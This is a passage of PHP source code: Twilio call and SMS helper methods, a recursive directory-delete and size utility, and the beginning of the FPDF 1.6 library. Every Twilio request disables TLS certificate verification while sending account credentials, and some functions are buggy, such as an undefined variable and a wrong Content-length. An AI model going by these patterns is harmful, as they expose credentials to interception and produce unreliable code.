               	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
               	curl_close($ch);
               	//print_r($jsonstr); 
                for($i=0;$i<count($jsonstr['calls']);$i++){
                	if((abs(strtotime($jsonstr['calls'][$i]['date_created'])-$timestamp)<='3')&&($jsonstr['calls'][$i]['to']==$this->twilionumber)&&($jsonstr['calls'][$i]['from']==$clientdialnumber)&&(($jsonstr['calls'][$i]['status']!='completed')&&($jsonstr['calls'][$i]['status']!='failed')&&($jsonstr['calls'][$i]['status']!='no-answer'))){
                		//echo 'u';
                		$url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls/".$jsonstr['calls'][$i]['sid'].".".$type;
               			$postdata = array(
											"Url"  => "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Dial><Number>".$usercallid."</Number></Dial></Response>")
										);          			
          					$header[] = "Content-length: ".strlen($postdata);                
                		//echo $postdata['url'];
                		$ch = curl_init();
                		curl_setopt($ch, CURLOPT_URL, $url);
                		curl_setopt($ch, CURLOPT_HEADER, 0);
                		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                		curl_setopt($ch, CURLOPT_POST, 1);
                		curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                		curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
               		 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                		curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                		$jsonstr2 = json_decode(curl_exec($ch),true);
                		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                		curl_close($ch);	
                		//print_r($jsonstr2);
										return 'ok';	
										break;									
                	}
              	}
              	//if($result == 'ok'){
              	//	return result;	
              	//}
                //print_r(json_decode($jsonstr,true));
}

function twiliosendsms($type='json',$to,$body){
                $url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/SMS/Messages.".$type;
               	$postdata = array(
									"From"  => $this->twilionumber,
									"To"  => $to,
									"Body"  => iconv('gb2312','utf-8',$body)
								);          			
          			$header[] = "Content-length: ".strlen($postdata);                
                //echo $url;
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $jsonstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
								return json_decode($jsonstr,true);
}

function twiliomakecallverify($type='json',$to,$link){
                $url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls.".$type;
               	$postdata = array(
									"From"  => $this->twilionumber,
									"To"  => $to,
									"Url"  => "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Play loop='5'>".$link."</Play></Response>")
								);          			
								//echo "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Play loop='5'>".$link."</Play></Response>");
          			$header[] = "Content-length: ".strlen($postdata);                
                //echo $url;
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $jsonstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
								return json_decode($jsonstr,true);
}

function twiliomakecall($type='json',$from){
                $url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls.".$type;
               	$postdata = array(
									"From"  => $this->twilionumber,
									"To"  => $from,
									"Url"  => "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Dial><Number>".$to."</Number></Dial></Response>")
								);          			
          			$header[] = "Content-length: ".strlen($postdata);                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $jsonstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
								return json_decode($jsonstr,true);
}

function twiliosimplewebcall($type='json',$from,$to){
                $url = "https://api.twilio.com/2010-04-01/Accounts/".$this->AccountSid."/Calls.".$type;
               	$postdata = array(
									"From"  => $this->twilionumber,
									"To"  => $from,
									"Url"  => "http://twimlets.com/echo?Twiml=".encodeuri("<Response><Dial><Number>".$to."</Number></Dial></Response>")
								);          			
          			$header[] = "Content-length: ".strlen($postdata);                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_USERPWD, $this->AccountSid.':'.$this->AuthToken);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $jsonstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
								return json_decode($jsonstr,true);
}

}
?>

<?php 
//循环删除目录和文件函数
function delDirAndFile($dirName,$self,$son)
{
if ( $handle = opendir($dirName)) {
   while (false !== ($item = readdir($handle))) {
   	if ($item != "." && $item != ".." ) {
   		if (is_dir($dirName."/".$item)) {
   			delDirAndFile($dirName."/".$item,$son,$son);
   		} 
   		else {
   			if(unlink($dirName."/".$item)){
					//echo "成功删除文件： $dirName/$item<br />\n";
					//return true;
   			}
   		}
   	}
   }
   closedir($handle);
   if($self == '1'){
   	if(rmdir($dirName)){
   		//echo "成功删除目录： $dirName<br />\n";
   		//return true;
   	}
   }
}
}

function getDirSize($dir)
    { 
        $handle = opendir($dir);
        while (false!==($FolderOrFile = readdir($handle)))
        { 
            if($FolderOrFile != "." && $FolderOrFile != "..") 
            { 
                if(is_dir("$dir/$FolderOrFile"))
                { 
                    $sizeResult += getDirSize("$dir/$FolderOrFile"); 
                }
                else
                { 
                    $sizeResult += filesize("$dir/$FolderOrFile"); 
                }
            }    
        }
        closedir($handle);
        return $sizeResult;
    }

?>


<?php 
/*******************************************************************************
* FPDF                                                                         *
*                                                                              *
* Version: 1.6                                                                 *
* Date:    2008-08-03                                                          *
* Author:  Olivier PLATHEY                                                     *
*******************************************************************************/

define('FPDF_VERSION','1.6');

class FPDF
{
var $page;               //current page number
var $n;                  //current object number
var $offsets;            //array of object offsets
var $buffer;             //buffer holding in-memory PDF
var $pages;              //array containing pages
var $state;              //current document state
var $compress;           //compression flag
var $k;                  //scale factor (number of points in user unit)
var $DefOrientation;     //default orientation
var $CurOrientation;     //current orientation
var $PageFormats;        //available page formats
var $DefPageFormat;      //default page format
var $CurPageFormat;      //current page format
var $PageSizes;          //array storing non-default page sizes
var $wPt,$hPt;           //dimensions of current page in points
var $w,$h;               //dimensions of current page in user unit
var $lMargin;            //left margin
var $tMargin;            //top margin
var $rMargin;            //right margin
var $bMargin;            //page break margin
var $cMargin;            //cell margin
var $x,$y;               //current position in user unit
var $lasth;              //height of last printed cell
var $LineWidth;          //line width in user unit
var $CoreFonts;          //array of standard font names
var $fonts;              //array of used fonts
var $FontFiles;          //array of font files
var $diffs;              //array of encoding differences
var $FontFamily;         //current font family
var $FontStyle;          //current font style
var $underline;          //underlining flag
var $CurrentFont;        //current font info
var $FontSizePt;         //current font size in points
var $FontSize;           //current font size in user unit
var $DrawColor;          //commands for drawing color
var $FillColor;          //commands for filling color
var $TextColor;          //commands for text color
var $ColorFlag;          //indicates whether fill and text colors are different
var $ws;                 //word spacing
var $images;             //array of used images
var $PageLinks;          //array of links in pages
var $links;              //array of internal links
var $AutoPageBreak;      //automatic page breaking
var $PageBreakTrigger;   //threshold used to trigger page breaks
var $InHeader;           //flag set when processing header
var $InFooter;           //flag set when processing footer
var $ZoomMode;           //zoom display mode
var $LayoutMode;         //layout display mode
var $title;              //title
var $subject;            //subject
var $author;             //author
var $keywords;           //keywords
var $creator;            //creator
var $AliasNbPages;       //alias for total number of pages
var $PDFVersion;         //PDF version number

/*******************************************************************************
*                                                                              *
*                               Public methods                                 *
*                                                                              *
*******************************************************************************/
function FPDF($orientation='P', $unit='mm', $format='A4')
{
	//Some checks
	$this->_dochecks();
	//Initialization of properties
	$this->page=0;
	$this->n=2;
	$this->buffer='';
	$this->pages=array();
	$this->PageSizes=array();
	$this->state=0;
	$this->fonts=array();
	$this->FontFiles=array();
	$this->diffs=array();
	$this->images=array();
	$this->links=array();
	$this->InHeader=false;
	$this->InFooter=false;
	$this->lasth=0;
	$this->FontFamily='';
	$this->FontStyle='';
	$this->FontSizePt=12;
	$this->underline=false;
	$this->DrawColor='0 G';
	$this->FillColor='0 g';
	$this->TextColor='0 g';
	$this->ColorFlag=false;
	$this->ws=0;
	//Standard fonts
	$this->CoreFonts=array('courier'=>'Courier', 'courierB'=>'Courier-Bold', 'courierI'=>'Courier-Oblique', 'courierBI'=>'Courier-BoldOblique',
		'helvetica'=>'Helvetica', 'helveticaB'=>'Helvetica-Bold', 'helveticaI'=>'Helvetica-Oblique', 'helveticaBI'=>'Helvetica-BoldOblique',
		'times'=>'Times-Roman', 'timesB'=>'Times-Bold', 'timesI'=>'Times-Italic', 'timesBI'=>'Times-BoldItalic',
		'symbol'=>'Symbol', 'zapfdingbats'=>'ZapfDingbats');
	//Scale factor
	if($unit=='pt')
		$this->k=1;
	elseif($unit=='mm')
		$this->k=72/25.4;
	elseif($unit=='cm')
		$this->k=72/2.54;
	elseif($unit=='in')
		$this->k=72;
	else
		$this->Error('Incorrect unit: '.$unit);
	//Page format
	$this->PageFormats=array('a3'=>array(841.89,1190.55), 'a4'=>array(595.28,841.89), 'a5'=>array(420.94,595.28),
		'letter'=>array(612,792), 'legal'=>array(612,1008));
	if(is_string($format))
		$format=$this->_getpageformat($format);
	$this->DefPageFormat=$format;
	$this->CurPageFormat=$format;
	//Page orientation
	$orientation=strtolower($orientation);
	if($orientation=='p' || $orientation=='portrait')
	{
		$this->DefOrientation='P';
		$this->w=$this->DefPageFormat[0];
		$this->h=$this->DefPageFormat[1];
	}
	elseif($orientation=='l' || $orientation=='landscape')
	{
		$this->DefOrientation='L';
		$this->w=$this->DefPageFormat[1];
		$this->h=$this->DefPageFormat[0];
	}
	else
		$this->Error('Incorrect orientation: '.$orientation);
	$this->CurOrientation=$this->DefOrientation;
	$this->wPt=$this->w*$this->k;
	$this->hPt=$this->h*$this->k;
	//Page margins (1 cm)
	$margin=28.35/$this->k;
	$this->SetMargins($margin,$margin);
	//Interior cell margin (1 mm)
	$this->cMargin=$margin/10;
	//Line width (0.2 mm)
	$this->LineWidth=.567/$this->k;
	//Automatic page break
	$this->SetAutoPageBreak(true,2*$margin);
	//Full width display mode
	$this->SetDisplayMode('fullwidth');
	//Enable compression
	$this->SetCompression(true);
	//Set default PDF version number
	$this->PDFVersion='1.3';
}

function SetMargins($left, $top, $right=null)
{
	//Set left, top and right margins
	$this->lMargin=$left;
	$this->tMargin=$top;
	if($right===null)
		$right=$left;
	$this->rMargin=$right;
}

function SetLeftMargin($margin)
{
	//Set left margin
	$this->lMargin=$margin;
	if($this->page>0 && $this->x<$margin)
		$this->x=$margin;
}

function SetTopMargin($margin)
{
	//Set top margin
	$this->tMargin=$margin;
}

function SetRightMargin($margin)
{
	//Set right margin
	$this->rMargin=$margin;
}

function SetAutoPageBreak($auto, $margin=0)
{
	//Set auto page break mode and triggering margin
	$this->AutoPageBreak=$auto;
	$this->bMargin=$margin;
	$this->PageBreakTrigger=$this->h-$margin;
}

function SetDisplayMode($zoom, $layout='continuous')
{
	//Set display mode in viewer
	if($zoom=='fullpage' || $zoom=='fullwidth' || $zoom=='real' || $zoom=='default' || !is_string($zoom))
		$this->ZoomMode=$zoom;
	else
		$this->Error('Incorrect zoom display mode: '.$zoom);
	if($layout=='single' || $layout=='continuous' || $layout=='two' || $layout=='default')
		$this->LayoutMode=$layout;
	else
		$this->Error('Incorrect layout display mode: '.$layout);
}

function SetCompression($compress)
{
	//Set page compression
	if(function_exists('gzcompress'))
		$this->compress=$compress;
	else
		$this->compress=false;
}

function SetTitle($title, $isUTF8=false)
{
	//Title of document
	if($isUTF8)
		$title=$this->_UTF8toUTF16($title);
	$this->title=$title;
}

function SetSubject($subject, $isUTF8=false)
{
	//Subject of document
	if($isUTF8)
		$subject=$this->_UTF8toUTF16($subject);
	$this->subject=$subject;
}

function SetAuthor($author, $isUTF8=false)
{
	//Author of document
	if($isUTF8)
		$author=$this->_UTF8toUTF16($author);
	$this->author=$author;
}

function SetKeywords($keywords, $isUTF8=false)
{
	//Keywords of document
	if($isUTF8)
		$keywords=$this->_UTF8toUTF16($keywords);
	$this->keywords=$keywords;
}

function SetCreator($creator, $isUTF8=false)
{
	//Creator of document
	if($isUTF8)
		$creator=$this->_UTF8toUTF16($creator);
	$this->creator=$creator;
}

function AliasNbPages($alias='{nb}')
{
	//Define an alias for total number of pages
	$this->AliasNbPages=$alias;
}

function Error($msg)
{
	//Fatal error
	die('<b>FPDF error:</b> '.$msg);
}

function Open()
{
	//Begin document
	$this->state=1;
}

function Close()
{
	//Terminate document
	if($this->state==3)
		return;
	if($this->page==0)
		$this->AddPage();
	//Page footer
	$this->InFooter=true;
	$this->Footer();
	$this->InFooter=false;
	//Close page
	$this->_endpage();
	//Close document
	$this->_enddoc();
}

function AddPage($orientation='', $format='')
{
	//Start a new page
	if($this->state==0)
		$this->Open();
	$family=$this->FontFamily;
	$style=$this->FontStyle.($this->underline ? 'U' : '');
	$size=$this->FontSizePt;
	$lw=$this->LineWidth;
	$dc=$this->DrawColor;
	$fc=$this->FillColor;
	$tc=$this->TextColor;
	$cf=$this->ColorFlag;
	if($this->page>0)
	{
		//Page footer
		$this->InFooter=true;
		$this->Footer();
		$this->InFooter=false;
		//Close page
		$this->_endpage();
	}
	//Start new page
	$this->_beginpage($orientation,$format);
	//Set line cap style to square
	$this->_out('2 J');
	//Set line width
	$this->LineWidth=$lw;
	$this->_out(sprintf('%.2F w',$lw*$this->k));
	//Set font
	if($family)
		$this->SetFont($family,$style,$size);
	//Set colors
	$this->DrawColor=$dc;
	if($dc!='0 G')
		$this->_out($dc);
	$this->FillColor=$fc;
	if($fc!='0 g')
		$this->_out($fc);
	$this->TextColor=$tc;
	$this->ColorFlag=$cf;
	//Page header
	$this->InHeader=true;
	$this->Header();
	$this->InHeader=false;
	//Restore line width
	if($this->LineWidth!=$lw)
	{
		$this->LineWidth=$lw;
		$this->_out(sprintf('%.2F w',$lw*$this->k));
	}
	//Restore font
	if($family)
		$this->SetFont($family,$style,$size);
	//Restore colors
	if($this->DrawColor!=$dc)
	{
		$this->DrawColor=$dc;
		$this->_out($dc);
	}
	if($this->FillColor!=$fc)
	{
		$this->FillColor=$fc;
		$this->_out($fc);
	}
	$this->TextColor=$tc;
	$this->ColorFlag=$cf;
}

function Header()
{
	//To be implemented in your own inherited class
}

function Footer()
{
	//To be implemented in your own inherited class
}

function PageNo()
{
	//Get current page number
	return $this->page;
}

function SetDrawColor($r, $g=null, $b=null)
{
	//Set color for all stroking operations
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->DrawColor=sprintf('%.3F G',$r/255);
	else
		$this->DrawColor=sprintf('%.3F %.3F %.3F RG',$r/255,$g/255,$b/255);
	if($this->page>0)
		$this->_out($this->DrawColor);
}

function SetFillColor($r, $g=null, $b=null)
{
	//Set color for all filling operations
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->FillColor=sprintf('%.3F g',$r/255);
	else
		$this->FillColor=sprintf('%.3F %.3F %.3F rg',$r/255,$g/255,$b/255);
	$this->ColorFlag=($this->FillColor!=$this->TextColor);
	if($this->page>0)
		$this->_out($this->FillColor);
}

function SetTextColor($r, $g=null, $b=null)
{
	//Set color for text
	if(($r==0 && $g==0 && $b==0) || $g===null)
		$this->TextColor=sprintf('%.3F g',$r/255);
	else
		$this->TextColor=sprintf('%.3F %.3F %.3F rg',$r/255,$g/255,$b/255);
	$this->ColorFlag=($this->FillColor!=$this->TextColor);
}

function GetStringWidth($s)
{
	//Get width of a string in the current font
	$s=(string)$s;
	$cw=&$this->CurrentFont['cw'];
	$w=0;
	$l=strlen($s);
	for($i=0;$i<$l;$i++)
		$w+=$cw[$s[$i]];
	return $w*$this->FontSize/1000;
}

function SetLineWidth($width)
{
	//Set line width
	$this->LineWidth=$width;
	if($this->page>0)
		$this->_out(sprintf('%.2F w',$width*$this->k));
}

function Line($x1, $y1, $x2, $y2)
{
	//Draw a line
	$this->_out(sprintf('%.2F %.2F m %.2F %.2F l S',$x1*$this->k,($this->h-$y1)*$this->k,$x2*$this->k,($this->h-$y2)*$this->k));
}

function Rect($x, $y, $w, $h, $style='')
{
	//Draw a rectangle
	if($style=='F')
		$op='f';
	elseif($style=='FD' || $style=='DF')
		$op='B';
	else
		$op='S';
	$this->_out(sprintf('%.2F %.2F %.2F %.2F re %s',$x*$this->k,($this->h-$y)*$this->k,$w*$this->k,-$h*$this->k,$op));
}

function AddFont($family, $style='', $file='')
{
	//Add a TrueType or Type1 font
	$family=strtolower($family);
	if($file=='')
		$file=str_replace(' ','',$family).strtolower($style).'.php';
	if($family=='arial')
		$family='helvetica';
	$style=strtoupper($style);
	if($style=='IB')
		$style='BI';
	$fontkey=$family.$style;
	if(isset($this->fonts[$fontkey]))
		return;
	include($this->_getfontpath().$file);
	if(!isset($name))
		$this->Error('Could not include font definition file');
	$i=count($this->fonts)+1;
	$this->fonts[$fontkey]=array('i'=>$i, 'type'=>$type, 'name'=>$name, 'desc'=>$desc, 'up'=>$up, 'ut'=>$ut, 'cw'=>$cw, 'enc'=>$enc, 'file'=>$file);
	if($diff)
	{
		//Search existing encodings
		$d=0;
		$nb=count($this->diffs);
		for($i=1;$i<=$nb;$i++)
		{
			if($this->diffs[$i]==$diff)
			{
				$d=$i;
				break;
			}
		}
		if($d==0)
		{
			$d=$nb+1;
			$this->diffs[$d]=$diff;
		}
		$this->fonts[$fontkey]['diff']=$d;
	}
	if($file)
	{
		if($type=='TrueType')
			$this->FontFiles[$file]=array('length1'=>$originalsize);
		else
			$this->FontFiles[$file]=array('length1'=>$size1, 'length2'=>$size2);
	}
}

function SetFont($family, $style='', $size=0)
{
	//Select a font; size given in points
	global $fpdf_charwidths;

	$family=strtolower($family);
	if($family=='')
		$family=$this->FontFamily;
	if($family=='arial')
		$family='helvetica';
	elseif($family=='symbol' || $family=='zapfdingbats')
		$style='';
	$style=strtoupper($style);
	if(strpos($style,'U')!==false)
	{
		$this->underline=true;
		$style=str_replace('U','',$style);
	}
	else
		$this->underline=false;
	if($style=='IB')
		$style='BI';
	if($size==0)
		$size=$this->FontSizePt;
	//Test if font is already selected
	if($this->FontFamily==$family && $this->FontStyle==$style && $this->FontSizePt==$size)
		return;
	//Test if used for the first time
	$fontkey=$family.$style;
	if(!isset($this->fonts[$fontkey]))
	{
		//Check if one of the standard fonts
		if(isset($this->CoreFonts[$fontkey]))
		{
			if(!isset($fpdf_charwidths[$fontkey]))
			{
				//Load metric file
				$file=$family;
				if($family=='times' || $family=='helvetica')
					$file.=strtolower($style);
				include($this->_getfontpath().$file.'.php');
				if(!isset($fpdf_charwidths[$fontkey]))
					$this->Error('Could not include font metric file');
			}
			$i=count($this->fonts)+1;
			$name=$this->CoreFonts[$fontkey];
			$cw=$fpdf_charwidths[$fontkey];
			$this->fonts[$fontkey]=array('i'=>$i, 'type'=>'core', 'name'=>$name, 'up'=>-100, 'ut'=>50, 'cw'=>$cw);
		}
		else
			$this->Error('Undefined font: '.$family.' '.$style);
	}
	//Select it
	$this->FontFamily=$family;
	$this->FontStyle=$style;
	$this->FontSizePt=$size;
	$this->FontSize=$size/$this->k;
	$this->CurrentFont=&$this->fonts[$fontkey];
	if($this->page>0)
		$this->_out(sprintf('BT /F%d %.2F Tf ET',$this->CurrentFont['i'],$this->FontSizePt));
}

function SetFontSize($size)
{
	//Set font size in points
	if($this->FontSizePt==$size)
		return;
	$this->FontSizePt=$size;
	$this->FontSize=$size/$this->k;
	if($this->page>0)
		$this->_out(sprintf('BT /F%d %.2F Tf ET',$this->CurrentFont['i'],$this->FontSizePt));
}

function AddLink()
{
	//Create a new internal link
	$n=count($this->links)+1;
	$this->links[$n]=array(0, 0);
	return $n;
}

function SetLink($link, $y=0, $page=-1)
{
	//Set destination of internal link
	if($y==-1)
		$y=$this->y;
	if($page==-1)
		$page=$this->page;
	$this->links[$link]=array($page, $y);
}

function Link($x, $y, $w, $h, $link)
{
	//Put a link on the page
	$this->PageLinks[$this->page][]=array($x*$this->k, $this->hPt-$y*$this->k, $w*$this->k, $h*$this->k, $link);
}

function Text($x, $y, $txt)
{
	//Output a string
	$s=sprintf('BT %.2F %.2F Td (%s) Tj ET',$x*$this->k,($this->h-$y)*$this->k,$this->_escape($txt));
	if($this->underline && $txt!='')
		$s.=' '.$this->_dounderline($x,$y,$txt);
	if($this->ColorFlag)
		$s='q '.$this->TextColor.' '.$s.' Q';
	$this->_out($s);
}

function AcceptPageBreak()
{
	//Accept automatic page break or not
	return $this->AutoPageBreak;
}

function Cell($w, $h=0, $txt='', $border=0, $ln=0, $align='', $fill=false, $link='')
{
	//Output a cell
	$k=$this->k;
	if($this->y+$h>$this->PageBreakTrigger && !$this->InHeader && !$this->InFooter && $this->AcceptPageBreak())
	{
		//Automatic page break
		$x=$this->x;
		$ws=$this->ws;
		if($ws>0)
		{
			$this->ws=0;
			$this->_out('0 Tw');
		}
		$this->AddPage($this->CurOrientation,$this->CurPageFormat);
		$this->x=$x;
		if($ws>0)
		{
			$this->ws=$ws;
			$this->_out(sprintf('%.3F Tw',$ws*$k));
		}
	}
	if($w==0)
		$w=$this->w-$this->rMargin-$this->x;
	$s='';
	if($fill || $border==1)
	{
		if($fill)
			$op=($border==1) ? 'B' : 'f';
		else
			$op='S';
		$s=sprintf('%.2F %.2F %.2F %.2F re %s ',$this->x*$k,($this->h-$this->y)*$k,$w*$k,-$h*$k,$op);
	}
	if(is_string($border))
	{
		$x=$this->x;
		$y=$this->y;
		if(strpos($border,'L')!==false)
			$s.=sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-$y)*$k,$x*$k,($this->h-($y+$h))*$k);
		if(strpos($border,'T')!==false)
			$s.=sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-$y)*$k,($x+$w)*$k,($this->h-$y)*$k);
		if(strpos($border,'R')!==false)
			$s.=sprintf('%.2F %.2F m %.2F %.2F l S ',($x+$w)*$k,($this->h-$y)*$k,($x+$w)*$k,($this->h-($y+$h))*$k);
		if(strpos($border,'B')!==false)
			$s.=sprintf('%.2F %.2F m %.2F %.2F l S ',$x*$k,($this->h-($y+$h))*$k,($x+$w)*$k,($this->h-($y+$h))*$k);
	}
	if($txt!=='')
	{
		if($align=='R')
			$dx=$w-$this->cMargin-$this->GetStringWidth($txt);
		elseif($align=='C')
			$dx=($w-$this->GetStringWidth($txt))/2;
		else
			$dx=$this->cMargin;
		if($this->ColorFlag)
			$s.='q '.$this->TextColor.' ';
		$txt2=str_replace(')','\\)',str_replace('(','\\(',str_replace('\\','\\\\',$txt)));
		$s.=sprintf('BT %.2F %.2F Td (%s) Tj ET',($this->x+$dx)*$k,($this->h-($this->y+.5*$h+.3*$this->FontSize))*$k,$txt2);
		if($this->underline)
			$s.=' '.$this->_dounderline($this->x+$dx,$this->y+.5*$h+.3*$this->FontSize,$txt);
		if($this->ColorFlag)
			$s.=' Q';
		if($link)
			$this->Link($this->x+$dx,$this->y+.5*$h-.5*$this->FontSize,$this->GetStringWidth($txt),$this->FontSize,$link);
	}
	if($s)
		$this->_out($s);
	$this->lasth=$h;
	if($ln>0)
	{
		//Go to next line
		$this->y+=$h;
		if($ln==1)
			$this->x=$this->lMargin;
	}
	else
		$this->x+=$w;
}

function MultiCell($w, $h, $txt, $border=0, $align='J', $fill=false)
{
	//Output text with automatic or explicit line breaks
	$cw=&$this->CurrentFont['cw'];
	if($w==0)
		$w=$this->w-$this->rMargin-$this->x;
	$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
	$s=str_replace("\r",'',$txt);
	$nb=strlen($s);
	if($nb>0 && $s[$nb-1]=="\n")
		$nb--;
	$b=0;
	if($border)
	{
		if($border==1)
		{
			$border='LTRB';
			$b='LRT';
			$b2='LR';
		}
		else
		{
			$b2='';
			if(strpos($border,'L')!==false)
				$b2.='L';
			if(strpos($border,'R')!==false)
				$b2.='R';
			$b=(strpos($border,'T')!==false) ? $b2.'T' : $b2;
		}
	}
	$sep=-1;
	$i=0;
	$j=0;
	$l=0;
	$ns=0;
	$nl=1;
	while($i<$nb)
	{
		//Get next character
		$c=$s[$i];
		if($c=="\n")
		{
			//Explicit line break
			if($this->ws>0)
			{
				$this->ws=0;
				$this->_out('0 Tw');
			}
			$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			$i++;
			$sep=-1;
			$j=$i;
			$l=0;
			$ns=0;
			$nl++;
			if($border && $nl==2)
				$b=$b2;
			continue;
		}
		if($c==' ')
		{
			$sep=$i;
			$ls=$l;
			$ns++;
		}
		$l+=$cw[$c];
		if($l>$wmax)
		{
			//Automatic line break
			if($sep==-1)
			{
				if($i==$j)
					$i++;
				if($this->ws>0)
				{
					$this->ws=0;
					$this->_out('0 Tw');
				}
				$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			}
			else
			{
				if($align=='J')
				{
					$this->ws=($ns>1) ? ($wmax-$ls)/1000*$this->FontSize/($ns-1) : 0;
					$this->_out(sprintf('%.3F Tw',$this->ws*$this->k));
				}
				$this->Cell($w,$h,substr($s,$j,$sep-$j),$b,2,$align,$fill);
				$i=$sep+1;
			}
			$sep=-1;
			$j=$i;
			$l=0;
			$ns=0;
			$nl++;
			if($border && $nl==2)
				$b=$b2;
		}
		else
			$i++;
	}
	//Last chunk
	if($this->ws>0)
	{
		$this->ws=0;
		$this->_out('0 Tw');
	}
	if($border && strpos($border,'B')!==false)
		$b.='B';
	$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
	$this->x=$this->lMargin;
}

function Write($h, $txt, $link='')
{
	//Output text in flowing mode
	$cw=&$this->CurrentFont['cw'];
	$w=$this->w-$this->rMargin-$this->x;
	$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
	$s=str_replace("\r",'',$txt);
	$nb=strlen($s);
	$sep=-1;
	$i=0;
	$j=0;
	$l=0;
	$nl=1;
	while($i<$nb)
	{
		//Get next character
		$c=$s[$i];
		if($c=="\n")
		{
			//Explicit line break
			$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			$i++;
			$sep=-1;
			$j=$i;
			$l=0;
			if($nl==1)
			{
				$this->x=$this->lMargin;
				$w=$this->w-$this->rMargin-$this->x;
				$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
			continue;
		}
		if($c==' ')
			$sep=$i;
		$l+=$cw[$c];
		if($l>$wmax)
		{
			//Automatic line break
			if($sep==-1)
			{
				if($this->x>$this->lMargin)
				{
					//Move to next line
					$this->x=$this->lMargin;
					$this->y+=$h;
					$w=$this->w-$this->rMargin-$this->x;
					$wmax=($w-2*$this->cMargin)*1000/$this->FontSize;
					$i++;
					$nl++;
					continue;
				}
				if($i==$j)
					$i++;
				$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			}
			else
			{
				$this->Cell($w,$h,substr($s,$j,$sep-$j),0,2,'',0,$link);
				$i=$sep+1;
			}
			$sep=-1;
			$j=$i;
			$l=0;
			if($nl==1)
			{
